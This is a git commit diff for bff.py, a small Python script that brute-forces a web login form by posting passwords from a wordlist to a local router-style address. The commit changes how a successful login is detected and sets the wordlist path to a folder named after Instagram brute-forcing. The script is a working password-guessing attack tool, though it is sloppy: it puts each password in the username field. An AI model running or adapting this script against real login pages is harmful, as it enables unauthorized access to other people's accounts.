1bd874713dc79a1b3a8a0cb5e64fdfa3c7f06045
AmmArNabil <43491847+AmmArNabil@users.noreply.github.com>
2021-01-05 21:56:02 +0300

    Update bff.py

--- bff.py
+++ bff.py
@@ -2,18 +2,20 @@ import requests
 def bruteforce(username,url):
    for password in passwords:
       password = password.strip()
-      print(' tring to bruteforce password '+password)
+      print(' ___________****TRY ***________________ : '+password)
       data_dictionary = {'username':password ,'submit':'تسجيل الدخول'}
       resp = requests.post(url, data_dictionary)
       x = requests.get(url)
-      print(resp.json)
-      if "%27%46%2a%20%27%44%27%46%20%45%31%2a%28%37%20%28%27%44%41%39%44%0c%20%2d%27%48%44%20%44%27%2d%42%27%4b%20" in str(resp.request):
+      t = resp.text
+      
+      if  "http://10.0.0.1/status" in str(resp.text):
+          print("username is : "+ password)
           exit()
       else:
-          print("username is : "+ username)
+          
           pass
           
 url='http://10.0.0.1/login'
 username= 'admin'
-with open('pas.txt','r') as passwords:
+with open('/root/Desktop/brute/Brute-force-Instagram-2020/pass.txt','r') as passwords:
     bruteforce(username, url)
